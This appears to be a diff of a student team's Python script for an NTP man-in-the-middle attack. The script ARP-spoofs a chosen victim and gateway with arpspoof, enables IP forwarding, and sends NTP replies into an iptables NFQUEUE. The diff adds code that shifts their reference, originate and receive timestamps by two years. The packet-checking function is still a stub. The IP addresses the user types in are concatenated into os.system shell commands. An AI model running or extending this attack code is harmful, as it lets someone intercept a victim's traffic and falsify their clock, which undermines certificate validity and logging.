@@ -6,53 +6,69 @@ response packets in transit
 Task Division:
 #3 & #4 - Check_ntp(/*packet from netfilter queue) - Karthik
 	-Checks that ntp packet & that it's an ntp server response
-	-Passes ntp payload to modify_ntp()
-	-Checks return if 0 or payload
+	-Passes ntp packet to modify_ntp()
+	-Checks return if 0 or packet
 	-Handles udp manipulation - updating checksum
-	-Returns packet to netfilterqueue
-#5 - Modfy_ntp(/*ntp payload */) - Michael
+	-Returns udp packet to netfilterqueue
+#5 - Modfy_ntp(/*ntp packet */) - Michael
 	-Modifies the appropriate ntp packet fields
-	-Returns a payload or 0 if something went wrong
+	-Returns ntp packet or 0 if something went wrong
 #1 & #2 - main() - siddharth
 	-Setup arp spoofing, ip forwarding, kamene(scapy), netfilterqueue
 	-Print status messages handle clean up
 
 '''
 import os
+
 """
 import sys
 """
 from subprocess import Popen, DEVNULL
-#from netfilterqueue import NetfilterQueue
+# from netfilterqueue import NetfilterQueue
 from kamene.all import *
 from datetime import datetime
+from math import modf
+
+unit_conversion_to_seconds = {'microsecond': .000001, 'minutes': 60, 'hours': 3600,
+                              'days': 3600 * 24, 'years': 3600 * 24 * 365}
+
+adjustment = 2
+adjustment_unit = 'years'
+
 
 def check_ntp():  # argument is packet from netfilter queue
     print("check_ntp")
-    #calls modify_ntp
+    # calls modify_ntp
 
 
-def modify_ntp(ntp_payload):  # argument is ntp payload
-    print("modify_ntp")
-    #fields to change:
-    #-reference, originate, receive by the same offset
-    #ntp_pay
-    #for testing
-    ntp_payload.ref = 3750257481.2553115 #tis a float
+def modify_ntp(ntp_packet):  # argument is ntp payload
+    # fields to change:
+    # -reference, originate, receive by the same offset
     # for testing
-    ntp_payload.ref = adjust_ntp_time(ntp_payload.ref, adjustment, adjustment_unit)
-    #ntp_payload.orig = adjust_ntp_time(ntp_payload.orig, adjustment, adjustment_unit)
-    #ntp_payload.recv = adjust_ntp_time(ntp_payload.recv, adjustment, adjustment_unit)
+    # ntp_packet.ref = 3750257481.2553115  # tis a float
+    # for testing
+    ntp_packet.ref = adjust_ntp_time_by(ntp_packet.ref, adjustment, adjustment_unit)
+    ntp_packet.orig = adjust_ntp_time_by(ntp_packet.orig, adjustment, adjustment_unit)
+    ntp_packet.recv = adjust_ntp_time_by(ntp_packet.recv, adjustment, adjustment_unit)
+    return ntp_packet
 
-def adjust_ntp_time(ntp_timestamp, adjustment, adjustment_unit):
+def adjust_ntp_time_by(ntp_timestamp, adjustment, adjustment_unit):
     '''
     Adjust ntp_timestamp by the adjustment value for the given adjustment unit
     :param ntp_timestamp: float
     :param adjustment: int
-    :param adjustment_unit: one of the arguments of datetime.datetime
+    :param adjustment_unit: one of the arguments of datetime.datetime, except months
     :return: modified float datetime
     '''
-    datetime()
+    if adjustment_unit in unit_conversion_to_seconds:
+        return ntp_timestamp + adjustment * unit_conversion_to_seconds[adjustment_unit]
+    else:
+        print("ERROR: adjustment_unit not supported. timestamp not converted")
+        return ntp_timestamp
+    # timestamp = modf(ntp_timestamp)
+    # print(timestamp)
+    # datetime()
+
 
 def main():  # no arguments
     """
@@ -73,14 +89,13 @@ def main():  # no arguments
     gateway = input("Enter gateway IP address")
     vict = input("Enter victim's IP address")
     os.system(" echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system('iptables -F -vt raw') #flush existing IP tables
+    os.system('iptables -F -vt raw')  # flush existing IP tables
     """
     os.system("arpspoof -t " + gateway + " " + vict &> /dev/null) #output not redirected to null, printed on screen
     os.system("arpspoof" + " " + "-t" + " " + vict + " " + gateway)
     """
     p = Popen(['arpspoof', '-t', gateway, vict], stderr=DEVNULL, stdout=DEVNULL)
     q = Popen(['arpspoof', '-t', vict, gateway], stderr=DEVNULL, stdout=DEVNULL)
-
 
     os.system('iptables -t raw -A PREROUTING -p udp -d ' + gateway + ' --sport 123 -j NFQUEUE --queue-num 99')
     """
@@ -100,7 +115,6 @@ def main():  # no arguments
         nfqueue.run()
     except KeyboardInterrupt:
         print("Spoofing stopped")
-        os.system('iptables -F -vt raw') #hey
+        os.system('iptables -F -vt raw')
 
-
-#main()
+    # main()
